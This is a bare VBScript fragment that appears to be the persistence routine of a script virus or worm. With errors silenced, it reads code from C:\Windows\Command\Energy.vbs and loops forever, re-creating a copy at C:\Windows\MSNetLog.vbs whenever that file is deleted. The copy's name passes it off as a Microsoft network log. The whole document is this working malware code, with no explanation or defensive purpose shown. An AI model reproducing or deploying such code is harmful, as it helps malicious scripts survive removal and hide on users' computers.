On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set Energy = fso.OpenTextFile("C:\Windows\Command\Energy.vbs",1)
Code = Energy.ReadAll
Energy.Close
Do
If Not (fso.FileExists("C:\Windows\MSNetLog.vbs")) Then
Set Energy = fso.CreateTextFile("C:\Windows\MSNetLog.vbs", True)
Energy.Write Code
Energy.Close
End If
Loop